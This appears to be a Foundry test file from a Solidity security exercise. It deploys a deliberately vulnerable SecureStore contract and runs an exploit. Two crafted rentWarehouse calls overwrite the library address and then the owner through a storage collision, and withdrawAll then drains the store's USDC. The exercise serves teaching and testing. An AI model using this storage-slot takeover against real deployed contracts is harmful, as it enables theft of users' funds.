// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import {SecureStore} from "src/call-attacks-2/SecureStore.sol";
import {RentingLibrary} from "src/call-attacks-2/RentingLibrary.sol";
import {AttackContract} from "src/call-attacks-2/solution/AttackContract.sol";
import {DummyERC20} from "src/utils/DummyERC20.sol";

contract CATest2 is Test {
    SecureStore secureStore;
    RentingLibrary rentingLibrary;
    AttackContract attackContract;
    DummyERC20 usdc;


    address deployer = makeAddr("deployer");
    address attacker = makeAddr("attacker");

    uint256 private constant INITIAL_SUPPLY = 100 ether;
    uint256 private constant DAILY_RENT_PRICE = 50 ether;
    uint256 private constant STORE_INITIAL_BALANCE = 1000 ether;

    function setUp() public {
        vm.deal(deployer, 100 ether);
        vm.deal(attacker, 100 ether);

        vm.startPrank(deployer);
        rentingLibrary = new RentingLibrary();
        usdc = new DummyERC20("USDC Token", "USDC", INITIAL_SUPPLY);
        secureStore = new SecureStore(address(rentingLibrary), DAILY_RENT_PRICE, address(usdc));

        // store setup
        usdc.mint(attacker, INITIAL_SUPPLY);
        usdc.mint(address(secureStore), STORE_INITIAL_BALANCE);
        vm.stopPrank();
    }

    function test_Attack() public {
        console.log("RentingLibrary", secureStore.rentingLibrary());
        console.log("Owner", secureStore.owner());

        vm.startPrank(attacker);

        attackContract = new AttackContract();
        usdc.approve(address(secureStore), INITIAL_SUPPLY);
        secureStore.rentWarehouse(1, uint256(uint160(address(attackContract))));
        skip(3600 * 24);
        secureStore.rentWarehouse(1, uint256(uint160(attacker)));

        console.log("RentingLibrary ",secureStore.rentingLibrary());
        console.log("Owner", secureStore.owner());

        // steal all the usdc
        secureStore.withdrawAll();

        vm.stopPrank();
        assertEq(usdc.balanceOf(address(secureStore)), 0);
        
        // initial attacker balance + all of the funds in the SecureContract
        assertEq(usdc.balanceOf(attacker), STORE_INITIAL_BALANCE + INITIAL_SUPPLY);
    }
}